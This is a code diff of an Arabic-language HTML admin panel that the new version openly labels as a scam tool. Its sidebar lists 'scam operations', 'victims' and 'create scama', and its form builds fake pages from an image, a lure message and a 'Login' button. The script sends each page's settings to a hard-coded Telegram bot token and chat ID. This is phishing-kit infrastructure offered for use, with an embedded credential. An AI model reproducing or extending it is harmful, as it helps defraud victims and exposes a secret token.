@@ -2,202 +2,78 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم إنشاء الصفحات Pro 55</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <title>لوحة التحكم | Sp0m</title>
     <style>
-        /* أنماط أساسية من التصميم الهدف (image_7.png) */
-        :root {
-            --bg-color: #0a0e17; /* الخلفية الداكنة */
-            --card-bg: #141b2b; /* خلفية الكرت الداكنة */
-            --neon-cyan: #00f2fe; /* اللون النيون الساطع Cyan */
-            --gradient-start: #4facfe; /* بداية التدرج للأزرار */
-            --text-main: #ffffff; /* النص الأبيض الأساسي */
-            --text-sub: #8b9bb4; /* النص الفرعي الرمادي */
-            --border-subtle: rgba(255, 255, 255, 0.05); /* الحدود الخفية للكرت */
-            --border-focus: rgba(0, 242, 254, 0.4); /* الحدود عند التركيز */
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Cairo', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden; /* لمنع التمرير غير الضروري */
-        }
-
-        /* تنسيق الكرت الرئيسي (مقتبس من image_7.png) */
-        .admin-card {
-            background-color: var(--card-bg);
-            width: 90%;
-            max-width: 420px;
-            padding: 40px 30px;
-            border-radius: 28px;
-            text-align: right; /* محاذاة النص لليمين للغة العربية */
-            border: 1px solid var(--border-subtle);
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
-            position: relative;
-        }
-
-        /* عنوان لوحة التحكم */
-        .admin-header {
-            text-align: center;
-            margin-bottom: 35px;
-        }
-
-        .admin-title {
-            color: var(--neon-cyan);
-            font-size: 18px;
-            font-weight: 700;
-            margin: 0;
-        }
-
-        /* عناوين الحقول الفرعية (مقتبسة من image_6.png) */
-        .field-label {
-            font-size: 14px;
-            color: var(--text-sub);
-            font-weight: 700;
-            margin-bottom: 8px;
-            display: block;
-        }
-
-        /* تنسيق مدخلات البيانات الداكنة (مقتبس من image_7.png) */
-        input {
-            width: 100%;
-            padding: 18px;
-            margin-bottom: 20px;
-            background: rgba(255, 255, 255, 0.02); /* خلفية شفافة داكنة */
-            border: 1.5px solid var(--border-subtle);
-            border-radius: 15px;
-            color: var(--text-main);
-            font-family: 'Cairo', sans-serif;
-            box-sizing: border-box;
-            outline: none;
-            transition: 0.3s;
-            font-size: 15px;
-        }
-
-        input:focus {
-            border-color: var(--neon-cyan);
-            background: rgba(255, 255, 255, 0.05);
-            box-shadow: 0 0 10px var(--border-focus);
-        }
-
-        input::placeholder {
-            color: #4a5568; /* لون تلميح داكن يتناسب مع الخلفية */
-        }
-
-        /* تنسيق الزر الرئيسي النيون (مقتبس من image_7.png) */
-        .btn-create {
-            width: 100%;
-            padding: 18px;
-            font-weight: 800;
-            font-size: 17px;
-            background: linear-gradient(135deg, var(--gradient-start), var(--neon-cyan));
-            border: none;
-            border-radius: 15px;
-            cursor: pointer;
-            color: var(--bg-color); /* لون النص داكن للتباين مع النيون */
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-
-        .btn-create:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3);
-        }
-
-        .btn-create:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        /* تنسيق التذييل (مقتبس من image_7.png) */
-        .footer {
-            margin-top: 35px;
-            font-size: 11px;
-            color: var(--text-sub);
-            border-top: 1px solid var(--border-subtle);
-            padding-top: 20px;
-            text-align: center;
-        }
+        body { background-color: #f4f4f4; font-family: Tahoma, sans-serif; margin: 0; display: flex; height: 100vh; }
+        .sidebar { width: 280px; background: #fff; border-left: 1px solid #ddd; padding: 15px; }
+        .main-content { flex: 1; background: #fafafa; padding: 30px; }
+        .card { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); max-width: 600px; margin: 0 auto; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .sidebar-item { padding: 12px; border-bottom: 1px solid #eee; color: #666; }
+        .active { color: #007bff; font-weight: bold; background: #f0f7ff; }
     </style>
 </head>
 <body>
-    <div class="admin-card">
-        <div class="admin-header">
-            <h1 class="admin-title">إنشاء صفحة جديدة - لوحة التحكم</h1>
-        </div>
-
-        <form id="create-page-form">
-            <div class="form-group">
-                <label for="img-url" class="field-label">رابط الصورة:</label>
-                <input type="text" id="img-url" placeholder="ضع رابط الصورة هنا" required>
-            </div>
-
-            <div class="form-group">
-                <label for="page-text" class="field-label">الخطاب:</label>
-                <input type="text" id="page-text" placeholder="مثلاً: سجل لتحصل على خدمات" required>
-            </div>
-
-            <div class="form-group">
-                <label for="btn-text" class="field-label">اسم الزر:</label>
-                <input type="text" id="btn-text" placeholder="مثلاً: Login أو تفعيل الآن" required>
-            </div>
-
-            <button type="submit" class="btn-create" id="btn-submit">إنشاء سكاما (برؤية نيون)</button>
-        </form>
-
-        <div class="footer">
-            © 2026 Global Virtual Numbers Pro - لوحة الإدارة 55. جميع الحقوق محفوظة.
+    <div class="sidebar">
+        <div style="text-align:center; padding: 20px 0;"><strong>برو55ن</strong></div>
+        <div class="sidebar-item">عمليات احتيال</div>
+        <div class="sidebar-item">الضحايا</div>
+        <div class="sidebar-item active">إنشاء سكاما</div>
+    </div>
+    <div class="main-content">
+        <div class="card">
+            <h3>إنشاء صفحة جديدة</h3>
+            <label>رابط الصورة:</label>
+            <input type="text" id="img" placeholder="ضع رابط الصورة هنا">
+            <label>الخطاب:</label>
+            <input type="text" id="letter" placeholder="مثلاً: سجل لتحصل على شدات">
+            <label>اسم الزر:</label>
+            <input type="text" id="btnName" placeholder="Login">
+            <button class="btn" onclick="submitData()">إنشاء سكاما</button>
+            <p id="status" style="margin-top:15px; color: green; display:none; text-align:center;"></p>
         </div>
     </div>
 
     <script>
-        // كود برمجي أساسي لمعالجة النموذج (اختياري)
-        const form = document.getElementById('create-page-form');
-        const btnSubmit = document.getElementById('btn-submit');
+        async function submitData() {
+            // تصحيح علامات الاقتباس وإضافة المعرفات
+            const status = document.getElementById("status");
+            const imgVal = document.getElementById("img").value;
+            const letterVal = document.getElementById("letter").value;
+            const btnVal = document.getElementById("btnName").value;
+            
+            status.style.display = "block";
+            status.innerText = "⏳ جاري المعالجة...";
 
-        form.onsubmit = function(e) {
-            e.preventDefault();
-            btnSubmit.disabled = true;
-            btnSubmit.innerText = "جاري الإنشاء...";
+            // بيانات البوت الخاص بك
+            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
+            const chatId = "5174578125";
+            const message = `🛠️ إنشاء صفحة جديدة\n🖼️ الصورة: ${imgVal}\n📝 الخطاب: ${letterVal}\n🔘 الزر: ${btnVal}`;
 
-            // هنا يمكنك إضافة كود لإرسال البيانات إلى السيرفر الخاص بك
-            const imgUrl = document.getElementById('img-url').value.trim();
-            const pageText = document.getElementById('page-text').value.trim();
-            const btnText = document.getElementById('btn-text').value.trim();
+            try {
+                // الإرسال المباشر لتلجرام لضمان وصول التبليغ
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
 
-            console.log("تم تجميع البيانات لإنشاء الصفحة:");
-            console.log("رابط الصورة:", imgUrl);
-            console.log("الخطاب:", pageText);
-            console.log("اسم الزر:", btnText);
-
-            // تمثيل عملية الإنشاء
-            setTimeout(() => {
-                btnSubmit.innerText = "تم الإنشاء بنجاح!";
-                btnSubmit.style.background = "#238636"; // تغيير لون الزر للأخضر عند النجاح
-                btnSubmit.style.color = "#ffffff";
-                btnSubmit.style.boxShadow = "none";
-                
-                // إعادة التعيين (اختياري)
-                setTimeout(() => {
-                    btnSubmit.disabled = false;
-                    btnSubmit.innerText = "إنشاء سكاما (برؤية نيون)";
-                    btnSubmit.style.background = "linear-gradient(135deg, #4facfe, #00f2fe)";
-                    btnSubmit.style.color = "#0a0e17";
-                    btnSubmit.style.boxShadow = "0 10px 20px rgba(0, 242, 254, 0.3)";
-                    form.reset(); // مسح الحقول
-                }, 2000);
-            }, 1500);
-        };
+                if(res.ok) {
+                    status.style.color = "green";
+                    status.innerText = "✅ تم الإرسال للبوت بنجاح!";
+                } else {
+                    status.style.color = "red";
+                    status.innerText = "❌ فشل الإرسال (تأكد من إعدادات البوت)";
+                }
+            } catch (err) {
+                status.style.color = "red";
+                status.innerText = "❌ حدث خطأ في الشبكة";
+            }
+        }
     </script>
 </body>
 </html>
